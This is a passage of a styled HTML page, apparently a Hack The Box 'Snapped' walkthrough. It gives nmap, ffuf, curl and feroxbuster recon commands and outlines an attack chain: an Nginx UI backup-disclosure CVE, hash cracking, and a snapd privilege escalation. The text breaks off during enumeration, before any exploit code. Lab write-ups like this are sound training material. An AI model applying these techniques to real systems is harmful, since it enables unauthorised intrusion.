@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ═══════════════════════════════════════════════
+       EDIT THIS: Page title
+  ═══════════════════════════════════════════════ -->
+  <title>SYSTEM://HTB Snapped Writeup</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:ital,wght@0,300;0,400;0,600;1,400&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+
+  <style>
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DESIGN TOKENS                      ║
+       ╚══════════════════════════════════════════════╝ */
+    :root {
+      /* Core palette */
+      --cp-void:        #05050a;
+      --cp-deep:        #0a0a12;
+      --cp-surface:     #0d0d18;
+      --cp-surface-2:   #12121f;
+      --cp-surface-3:   #181828;
+      --cp-border:      #1e1e35;
+
+      /* Neon accents */
+      --cp-cyan:        #00f5ff;
+      --cp-cyan-dim:    #007a80;
+      --cp-cyan-glow:   rgba(0, 245, 255, 0.25);
+      --cp-cyan-muted:  rgba(0, 245, 255, 0.08);
+
+      --cp-magenta:     #ff0080;
+      --cp-magenta-dim: #7a003d;
+      --cp-magenta-glow: rgba(255, 0, 128, 0.25);
+
+      --cp-green:       #39ff14;
+      --cp-green-dim:   #1a7a08;
+      --cp-green-glow:  rgba(57, 255, 20, 0.2);
+
+      --cp-amber:       #ffb800;
+      --cp-amber-glow:  rgba(255, 184, 0, 0.2);
+
+      /* Text */
+      --cp-text:        #c8d8e8;
+      --cp-text-muted:  #6a7f94;
+      --cp-text-dim:    #3a4f60;
+
+      /* Typography */
+      --font-display: 'Orbitron', 'Courier New', monospace;
+      --font-body:    'Exo 2', 'Segoe UI', sans-serif;
+      --font-mono:    'Share Tech Mono', 'Courier New', monospace;
+
+      /* Spacing — mobile-first (tighter base) */
+      --sp-xs:  0.35rem;
+      --sp-sm:  0.7rem;
+      --sp-md:  1.2rem;
+      --sp-lg:  2rem;
+      --sp-xl:  3rem;
+
+      /* Layout */
+      --max-width:  1000px;
+      --radius:     4px;
+      --radius-lg:  8px;
+      --transition: all 0.2s ease;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           GLOBAL RESET & BASE               ║
+       ╚══════════════════════════════════════════════╝ */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      background: var(--cp-void);
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--cp-void);
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* CRT scanlines overlay — entire page */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.07) 2px,
+        rgba(0, 0, 0, 0.07) 4px
+      );
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* Circuit grid background */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: var(--cp-void); }
+    ::-webkit-scrollbar-thumb {
+      background: var(--cp-cyan-dim);
+      border-radius: 2px;
+    }
+    ::-webkit-scrollbar-thumb:hover { background: var(--cp-cyan); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TOP BAR / HEADER                  ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-topbar {
+      position: sticky;
+      top: 0;
+      z-index: 500;
+      width: 100%;
+      background: rgba(5, 5, 10, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--cp-cyan-dim);
+      box-shadow: 0 1px 20px var(--cp-cyan-glow);
+      padding: 0.6rem var(--sp-md);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: var(--sp-sm);
+    }
+
+    .cp-topbar-left {
+      display: flex;
+      align-items: center;
+      gap: var(--sp-sm);
+      min-width: 0;
+    }
+
+    /* Blinking status dot */
+    .cp-status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--cp-green);
+      box-shadow: 0 0 8px var(--cp-green);
+      flex-shrink: 0;
+      animation: blink-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes blink-dot {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.2; }
+    }
+
+    .cp-topbar-brand {
+      font-family: var(--font-display);
+      font-size: clamp(0.7rem, 2.5vw, 0.85rem);
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      color: var(--cp-cyan);
+      text-shadow: 0 0 12px var(--cp-cyan-glow);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .cp-topbar-brand span { color: var(--cp-magenta); }
+
+    /* EDIT: category tag */
+    .cp-topbar-tag {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      color: var(--cp-text-dim);
+      border: 1px solid var(--cp-border);
+      padding: 0.15em 0.5em;
+      border-radius: var(--radius);
+      white-space: nowrap;
+      display: none; /* hidden on very small screens */
+    }
+
+    @media (min-width: 400px) {
+      .cp-topbar-tag { display: inline; }
+    }
+
+    .cp-topbar-right {
+      font-family: var(--font-mono);
+      font-size: 0.6rem;
+      color: var(--cp-text-dim);
+      letter-spacing: 0.05em;
+      flex-shrink: 0;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MAIN CONTENT WRAPPER              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body {
+      position: relative;
+      z-index: 1;
+      font-family:  var(--font-body);
+      font-size:    clamp(0.95rem, 2.5vw, 1.05rem);
+      line-height:  1.8;
+      color:        var(--cp-text);
+      background:   var(--cp-surface);
+      max-width:    var(--max-width);
+      margin:       0 auto;
+      padding:      var(--sp-lg) var(--sp-md);
+      min-height:   100vh;
+
+      /* Left cyan accent line */
+      border-left:  2px solid var(--cp-cyan-dim);
+      border-right: 2px solid var(--cp-magenta-dim);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HEADINGS                          ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body h1, .cp-body h2, .cp-body h3,
+    .cp-body h4, .cp-body h5, .cp-body h6 {
+      font-family:    var(--font-display);
+      line-height:    1.2;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-top:     var(--sp-xl);
+      margin-bottom:  var(--sp-md);
+    }
+
+    /* H1 — Glitch effect */
+    .cp-body h1 {
+      font-size:   clamp(1.6rem, 5vw, 2.8rem);
+      font-weight: 900;
+      color:       var(--cp-cyan);
+      text-shadow:
+        0 0 20px var(--cp-cyan-glow),
+        0 0 60px rgba(0,245,255,0.1);
+      margin-top:  0;
+      position:    relative;
+      padding-bottom: var(--sp-sm);
+    }
+
+    /* Glitch underline bar */
+    .cp-body h1::after {
+      content:  '';
+      display:  block;
+      height:   3px;
+      width:    100%;
+      margin-top: var(--sp-xs);
+      background: linear-gradient(
+        90deg,
+        var(--cp-cyan),
+        var(--cp-magenta) 60%,
+        transparent
+      );
+      animation: glitch-bar 4s ease-in-out infinite;
+    }
+
+    @keyframes glitch-bar {
+      0%, 90%, 100% { transform: scaleX(1); opacity: 1; }
+      92%            { transform: scaleX(0.95) translateX(4px); opacity: 0.8; }
+      94%            { transform: scaleX(1.02) translateX(-3px); opacity: 1; }
+      96%            { transform: scaleX(0.98) translateX(2px); opacity: 0.9; }
+    }
+
+    /* Glitch text flicker on h1 */
+    .cp-body h1 {
+      animation: glitch-text 6s ease-in-out infinite;
+    }
+
+    @keyframes glitch-text {
+      0%, 88%, 100% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow), 0 0 60px rgba(0,245,255,0.1);
+        transform: none;
+      }
+      90% {
+        text-shadow:
+          -3px 0 var(--cp-magenta),
+          3px 0 var(--cp-cyan),
+          0 0 20px var(--cp-cyan-glow);
+        transform: skewX(-1deg);
+      }
+      92% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow);
+        transform: none;
+      }
+      94% {
+        text-shadow:
+          2px 0 var(--cp-magenta),
+          -2px 0 var(--cp-cyan);
+        transform: skewX(0.5deg);
+      }
+    }
+
+    /* H2 */
+    .cp-body h2 {
+      font-size:  clamp(1.2rem, 3.5vw, 1.8rem);
+      color:      var(--cp-cyan);
+      position:   relative;
+      padding:    var(--sp-sm) var(--sp-md);
+      background: var(--cp-cyan-muted);
+      border-left: 3px solid var(--cp-cyan);
+      border-radius: 0 var(--radius) var(--radius) 0;
+    }
+
+    .cp-body h2::before {
+      content:     '// ';
+      color:       var(--cp-cyan-dim);
+      font-family: var(--font-mono);
+      font-size:   0.8em;
+    }
+
+    /* H3 */
+    .cp-body h3 {
+      font-size: clamp(1rem, 3vw, 1.4rem);
+      color:     var(--cp-magenta);
+      text-shadow: 0 0 12px var(--cp-magenta-glow);
+    }
+
+    .cp-body h3::before {
+      content:     '> ';
+      font-family: var(--font-mono);
+      color:       var(--cp-magenta-dim);
+      font-size:   0.9em;
+    }
+
+    /* H4–H6 */
+    .cp-body h4 {
+      font-size: 1.05rem;
+      color:     var(--cp-amber);
+      letter-spacing: 0.1em;
+    }
+    .cp-body h4::before { content: '## '; font-family: var(--font-mono); color: var(--cp-text-dim); font-size: 0.8em; }
+
+    .cp-body h5 { font-size: 0.95rem; color: var(--cp-text); }
+    .cp-body h6 { font-size: 0.85rem; color: var(--cp-text-muted); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PARAGRAPHS & INLINE               ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body p {
+      margin-bottom: var(--sp-md);
+      font-weight:   300;
+      color:         var(--cp-text);
+    }
+
+    .cp-body p:last-child { margin-bottom: 0; }
+
+    .cp-body strong, .cp-body b {
+      color:       var(--cp-cyan);
+      font-weight: 600;
+    }
+
+    .cp-body em, .cp-body i {
+      color:      var(--cp-text-muted);
+      font-style: italic;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LINKS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body a {
+      color:           var(--cp-cyan);
+      text-decoration: none;
+      border-bottom:   1px dashed var(--cp-cyan-dim);
+      transition:      var(--transition);
+      font-weight:     600;
+      font-family:     var(--font-mono);
+      font-size:       0.95em;
+    }
+
+    .cp-body a:hover {
+      color:        var(--cp-cyan);
+      border-color: var(--cp-cyan);
+      text-shadow:  0 0 10px var(--cp-cyan-glow);
+      background:   var(--cp-cyan-muted);
+      padding:      0 0.2em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HORIZONTAL RULE                   ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body hr {
+      border: none;
+      height: 1px;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        var(--cp-magenta),
+        var(--cp-cyan),
+        transparent
+      );
+      margin: var(--sp-xl) 0;
+      position: relative;
+    }
+
+    .cp-body hr::before {
+      content:    '◈';
+      position:   absolute;
+      left:       50%;
+      top:        50%;
+      transform:  translate(-50%, -50%);
+      color:      var(--cp-cyan);
+      font-size:  0.9rem;
+      background: var(--cp-surface);
+      padding:    0 var(--sp-sm);
+      text-shadow: 0 0 10px var(--cp-cyan-glow);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           BLOCKQUOTE                        ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body blockquote {
+      position:     relative;
+      margin:       var(--sp-lg) 0;
+      padding:      var(--sp-md) var(--sp-lg);
+      background:   rgba(255, 0, 128, 0.05);
+      border-left:  3px solid var(--cp-magenta);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      color:        var(--cp-text-muted);
+      font-style:   italic;
+
+      /* Corner brackets */
+      outline: 1px solid rgba(255, 0, 128, 0.15);
+    }
+
+    /* Top-right corner bracket */
+    .cp-body blockquote::before {
+      content:    '⌝';
+      position:   absolute;
+      top:        -0.6rem;
+      right:      0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote::after {
+      content:    '⌞';
+      position:   absolute;
+      bottom:     -0.8rem;
+      left:       0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote p { margin: 0; }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LISTS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body ul, .cp-body ol {
+      margin:       var(--sp-md) 0;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body li { margin-bottom: var(--sp-xs); }
+
+    /* Unordered */
+    .cp-body ul { list-style: none; padding-left: var(--sp-md); }
+
+    .cp-body ul > li {
+      position:    relative;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body ul > li::before {
+      content:   '▶';
+      position:  absolute;
+      left:      0;
+      color:     var(--cp-cyan);
+      font-size: 0.55em;
+      top:       0.45em;
+      text-shadow: 0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body ul ul > li::before {
+      content: '◈';
+      color:   var(--cp-magenta);
+      font-size: 0.5em;
+      top: 0.5em;
+    }
+
+    .cp-body ul ul ul > li::before {
+      content: '─';
+      color:   var(--cp-text-dim);
+      font-size: 0.8em;
+    }
+
+    /* Ordered */
+    .cp-body ol { list-style: decimal; }
+    .cp-body ol li::marker {
+      color:       var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.9em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           CODE                              ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Inline code */
+    .cp-body code {
+      font-family:  var(--font-mono);
+      font-size:    0.88em;
+      color:        var(--cp-green);
+      background:   rgba(57, 255, 20, 0.07);
+      border:       1px solid var(--cp-green-dim);
+      padding:      0.1em 0.4em;
+      border-radius: var(--radius);
+      white-space:  nowrap;
+      text-shadow:  0 0 6px var(--cp-green-glow);
+    }
+
+    /* Code block */
+    .cp-body pre {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-top:    2px solid var(--cp-cyan);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-lg);
+      overflow-x:    auto;
+      margin:        var(--sp-lg) 0;
+      position:      relative;
+      box-shadow:
+        0 0 0 1px rgba(0,245,255,0.05),
+        0 8px 32px rgba(0,0,0,0.6),
+        inset 0 1px 0 rgba(0,245,255,0.08);
+
+      /* Subtle glow around the block */
+      filter: drop-shadow(0 0 8px rgba(0,245,255,0.05));
+    }
+
+    /* Terminal header bar */
+    .cp-body pre::before {
+      content:     'TERMINAL://EXEC';
+      display:     block;
+      font-family: var(--font-mono);
+      font-size:   0.6rem;
+      letter-spacing: 0.2em;
+      color:       var(--cp-cyan-dim);
+      margin-bottom: var(--sp-sm);
+      padding-bottom: var(--sp-sm);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body pre code {
+      background:  transparent;
+      border:      none;
+      padding:     0;
+      color:       var(--cp-green);
+      font-size:   0.9rem;
+      line-height: 1.7;
+      white-space: pre;
+      text-shadow: 0 0 4px var(--cp-green-glow);
+    }
+
+    /* Blinking cursor at end of code blocks */
+    .cp-body pre::after {
+      content:    '█';
+      color:      var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.85rem;
+      display:    inline-block;
+      animation:  cursor-blink 1.1s step-end infinite;
+      margin-left: 2px;
+      opacity:    0.7;
+    }
+
+    @keyframes cursor-blink {
+      0%, 100% { opacity: 0.7; }
+      50%       { opacity: 0; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TABLES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body table {
+      width:           100%;
+      border-collapse: collapse;
+      margin:          var(--sp-lg) 0;
+      font-size:       0.9rem;
+      font-family:     var(--font-mono);
+      border:          1px solid var(--cp-border);
+      border-radius:   var(--radius-lg);
+      overflow:        hidden;
+      box-shadow:      0 0 20px rgba(0,245,255,0.05);
+    }
+
+    .cp-body thead {
+      background: linear-gradient(135deg, #0a1520, #0d1a2a);
+      border-bottom: 2px solid var(--cp-cyan);
+    }
+
+    .cp-body thead th {
+      font-family:    var(--font-display);
+      font-size:      0.7rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color:          var(--cp-cyan);
+      padding:        var(--sp-sm) var(--sp-md);
+      text-align:     left;
+      text-shadow:    0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-body tbody tr {
+      background:  var(--cp-surface-2);
+      transition:  var(--transition);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body tbody tr:nth-child(even) {
+      background: var(--cp-surface-3);
+    }
+
+    .cp-body tbody tr:hover {
+      background:  rgba(0, 245, 255, 0.05);
+      box-shadow:  inset 3px 0 0 var(--cp-cyan);
+    }
+
+    .cp-body td {
+      padding:       var(--sp-sm) var(--sp-md);
+      color:         var(--cp-text);
+      vertical-align: top;
+    }
+
+    /* Mobile table scroll */
+    @media (max-width: 520px) {
+      .cp-body table { display: block; overflow-x: auto; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           IMAGES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body img {
+      max-width:    100%;
+      height:       auto;
+      display:      block;
+      border-radius: var(--radius-lg);
+      margin:       var(--sp-lg) auto;
+      border:       1px solid var(--cp-border);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan-dim),
+        0 8px 40px rgba(0,0,0,0.7),
+        0 0 20px rgba(0,245,255,0.05);
+      transition:   var(--transition);
+      filter:       saturate(0.85);
+    }
+
+    .cp-body img:hover {
+      border-color: var(--cp-cyan);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan),
+        0 12px 60px rgba(0,0,0,0.8),
+        0 0 30px var(--cp-cyan-glow);
+      filter:     saturate(1.1);
+      transform:  scale(1.01);
+    }
+
+    .cp-body figcaption {
+      text-align:    center;
+      font-size:     0.78rem;
+      font-family:   var(--font-mono);
+      color:         var(--cp-text-dim);
+      margin-top:    calc(-1 * var(--sp-sm));
+      margin-bottom: var(--sp-lg);
+      letter-spacing: 0.05em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MISC INLINE ELEMENTS              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body kbd {
+      font-family:   var(--font-mono);
+      font-size:     0.8em;
+      color:         var(--cp-cyan);
+      background:    var(--cp-surface-3);
+      border:        1px solid var(--cp-cyan-dim);
+      border-bottom: 2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius);
+      padding:       0.1em 0.5em;
+      text-shadow:   0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body mark {
+      background:    rgba(255, 184, 0, 0.15);
+      color:         var(--cp-amber);
+      border-radius: 2px;
+      padding:       0.05em 0.3em;
+      font-family:   var(--font-mono);
+      font-size:     0.9em;
+    }
+
+    .cp-body abbr[title] {
+      color:          var(--cp-cyan);
+      text-decoration: underline dotted var(--cp-cyan-dim);
+      cursor:         help;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DETAILS / SUMMARY                 ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body details {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-left:   2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-md);
+      margin:        var(--sp-md) 0;
+      transition:    border-color 0.2s;
+    }
+
+    .cp-body details[open] {
+      border-left-color: var(--cp-cyan);
+      box-shadow: inset 0 0 20px rgba(0,245,255,0.03);
+    }
+
+    .cp-body summary {
+      font-family:    var(--font-display);
+      font-size:      0.85rem;
+      letter-spacing: 0.1em;
+      color:          var(--cp-cyan);
+      cursor:         pointer;
+      user-select:    none;
+      list-style:     none;
+      display:        flex;
+      align-items:    center;
+      gap:            var(--sp-sm);
+      text-transform: uppercase;
+    }
+
+    .cp-body summary::before {
+      content:    '▶';
+      font-size:  0.65em;
+      transition: transform 0.2s ease;
+      color:      var(--cp-cyan-dim);
+    }
+
+    .cp-body details[open] > summary::before {
+      transform: rotate(90deg);
+      color:     var(--cp-cyan);
+    }
+
+    .cp-body details > *:not(summary) {
+      margin-top: var(--sp-md);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           SELECTION                         ║
+       ╚══════════════════════════════════════════════╝ */
+    ::selection {
+      background: rgba(0, 245, 255, 0.2);
+      color:      var(--cp-cyan);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           FOOTER                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-footer {
+      position:   relative;
+      z-index:    1;
+      max-width:  var(--max-width);
+      margin:     0 auto;
+      padding:    var(--sp-md);
+      border-top: 1px solid var(--cp-border);
+      display:    flex;
+      flex-wrap:  wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap:        var(--sp-sm);
+      font-family: var(--font-mono);
+      font-size:  0.65rem;
+      letter-spacing: 0.08em;
+      color:      var(--cp-text-dim);
+      text-transform: uppercase;
+    }
+
+    .cp-footer a {
+      color:      var(--cp-cyan-dim);
+      text-decoration: none;
+      border:     none;
+      font-family: var(--font-mono);
+      transition: var(--transition);
+    }
+
+    .cp-footer a:hover {
+      color:      var(--cp-cyan);
+      text-shadow: 0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-footer-sig {
+      color: var(--cp-text-dim);
+      font-size: 0.6rem;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           RESPONSIVE BREAKPOINTS            ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Small phones */
+    @media (max-width: 380px) {
+      .cp-body {
+        padding:   var(--sp-md) var(--sp-sm);
+        font-size: 0.9rem;
+        border-left-width: 1px;
+        border-right-width: 1px;
+      }
+      .cp-body h1 { font-size: 1.4rem; }
+      .cp-body h2 { font-size: 1.1rem; }
+      .cp-body h3 { font-size: 1rem; }
+      .cp-body pre { padding: var(--sp-md) var(--sp-sm); font-size: 0.78rem; }
+    }
+
+    /* Tablets and up */
+    @media (min-width: 768px) {
+      .cp-body {
+        padding:   var(--sp-xl) var(--sp-lg);
+        font-size: 1.05rem;
+      }
+      :root {
+        --sp-md: 1.4rem;
+        --sp-lg: 2.4rem;
+        --sp-xl: 3.4rem;
+      }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PRINT                             ║
+       ╚══════════════════════════════════════════════╝ */
+    @media print {
+      body::before, body::after { display: none; }
+      .cp-topbar, .cp-footer    { display: none; }
+      .cp-body {
+        background: #fff;
+        color: #111;
+        border: none;
+        max-width: 100%;
+      }
+      .cp-body h1,.cp-body h2,.cp-body h3 { color: #000; text-shadow: none; animation: none; }
+      .cp-body a { color: #000; border-bottom: 1px solid #000; }
+      .cp-body pre, .cp-body code { background: #f0f0f0; color: #111; text-shadow: none; }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       TOP BAR
+       EDIT: .cp-topbar-brand  → your site name
+             .cp-topbar-tag    → your category
+  ═══════════════════════════════════════════════════════════ -->
+  <header class="cp-topbar">
+    <div class="cp-topbar-left">
+      <div class="cp-status-dot"></div>
+      <span class="cp-topbar-brand"><span>M</span>NOTES<span>//</span>SEC</span>
+      <span class="cp-topbar-tag">CYBER · LABS · INTEL</span>
+    </div>
+    <div class="cp-topbar-right" id="cp-clock">SYSTEM ONLINE</div>
+  </header>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       CONTENT ZONE
+       PASTE your markdown-converted HTML between the markers.
+       Keep <main class="cp-body"> — it applies all styles.
+  ═══════════════════════════════════════════════════════════ -->
+  <main class="cp-body">
+<h2>HTB Snapped Walkthrough Summary</h2>
+<p>Snapped is a Linux box running nginx as a reverse proxy, serving a static marketing site and an <strong>Nginx UI admin panel</strong>. The attack chain is:</p>
+<ol>
+<li>Enumerate subdomains → find <code>admin.snapped.htb</code> running Nginx UI v2.3.2</li>
+<li>Exploit <strong>CVE-2026-27944</strong> : unauthenticated backup download + key disclosure in <code>X-Backup-Security</code> header</li>
+<li>Decrypt the backup with AES-256-CBC → extract a SQLite database with bcrypt hashes</li>
+<li>Crack <code>jonathan</code>&#39;s hash with hashcat → SSH access</li>
+<li>Exploit <strong>CVE-2026-3888</strong> : snapd/snap-confine race condition via <code>systemd-tmpfiles</code> cleanup → SYSTEM (root)</li>
+</ol>
+<hr>
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#01--environment--initial-recon">01 · Environment &amp; Initial Recon</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#02--subdomain-discovery">02 · Subdomain Discovery</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#03--snappedhtb-enumeration">03 · snapped.htb Enumeration</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#04--adminsnappedhtb--nginx-ui">04 · admin.snapped.htb — Nginx UI</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#05--cve-2026-27944--unauthenticated-backup-decryption">05 · CVE-2026-27944 — Unauthenticated Backup Decryption</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#06--extracting-credentials-from-sqlite-database">06 · Extracting Credentials from SQLite Database</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#07--shell-as-jonathan">07 · Shell as jonathan</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#08--privilege-escalation-enumeration">08 · Privilege Escalation Enumeration</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#09--cve-2026-3888--snapd-race-condition-lpe">09 · CVE-2026-3888 — snapd Race Condition LPE</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#key-concepts--analyst-notes">Key Concepts &amp; Analyst Notes</a></li>
+</ul>
+<hr>
+<h2>01 · Environment &amp; Initial Recon</h2>
+<h3>Nmap Scan</h3>
+<pre><code class="language-bash"># Fast full port scan
+sudo nmap -p- -vvv --min-rate 10000 10.129.17.88
+
+# Service/version scan
+sudo nmap -p 22,80 -sCV 10.129.17.88
+</code></pre>
+<p><strong>Open ports:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version / Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>nginx 1.24.0 — redirects to <code>snapped.htb</code></td>
+</tr>
+</tbody></table>
+<p><strong>OS fingerprinting:</strong></p>
+<ul>
+<li>TTL of 63 → Linux, one hop away</li>
+<li>OpenSSH 9.6p1 + nginx 1.24.0 → <strong>Ubuntu 24.04 Noble LTS</strong></li>
+</ul>
+<pre><code class="language-bash"># Add to /etc/hosts
+echo &quot;10.129.17.88 snapped.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<hr>
+<h2>02 · Subdomain Discovery</h2>
+<pre><code class="language-bash"># Brute-force subdomains using ffuf with auto-calibration
+ffuf -u http://10.129.17.88 \
+    -H &#39;Host: FUZZ.snapped.htb&#39; \
+    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
+    -ac
+
+# Result:
+# admin    [Status: 200, Size: 1407]
+</code></pre>
+<pre><code class="language-bash"># Update /etc/hosts
+echo &quot;10.129.17.88 snapped.htb admin.snapped.htb&quot; | sudo tee /etc/hosts
+</code></pre>
+<blockquote>
+<p>💡 <strong><code>-ac</code> (auto-calibration)</strong> is the key flag here — it automatically filters responses that match the baseline (size, words, lines) of the default response, removing false positives without manual tuning.</p>
+</blockquote>
+<hr>
+<h2>03 · snapped.htb Enumeration</h2>
+<h3>Site Analysis</h3>
+<ul>
+<li>Static marketing/landing page for &quot;infrastructure orchestration platform&quot;</li>
+<li>All links are anchor points on the same page — no dynamic functionality</li>
+<li>Email found: <code>contact@snapped.htb</code></li>
+</ul>
+<h3>Tech Stack Detection</h3>
+<pre><code class="language-bash">curl -I http://snapped.htb
+# Server: nginx/1.24.0 (Ubuntu)
+# 404 page is default nginx → confirms static nginx setup
+</code></pre>
+<h3>Directory Brute Force</h3>
+<pre><code class="language-bash">feroxbuster -u http://snapped.htb -x html
+# Results: index.html, style.css — nothing interesting
+</code></pre>
+<hr>
+<h2>04 · admin.snapped.htb — Nginx UI</h2>
+<h3>Identify the Application</h3>
+<p>The admin subdomain hosts <strong>Nginx UI</strong> — a web-based management panel for nginx.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/0xJacky/nginx-ui">https://github.com/0xJacky/nginx-ui</a></li>
+<li>Backend: Go | Frontend: Vue.js / TypeScript</li>
+</ul>
+<h3>Version Discovery</h3>
+<pre><code class="language-bash"># Find the main JS bundle filename
+curl http://admin.snapped.htb/ -s | grep -P &#39;.js\b&#39;
+# &lt;script src=&quot;./assets/index-DoHxQupa.js&quot;&gt;
+
+# Find version JS file references inside the bundle
+curl http://admin.snapped.htb/assets/index-DoHxQupa.js -s | grep -oP &#39;version[-\w]*\.js&#39;
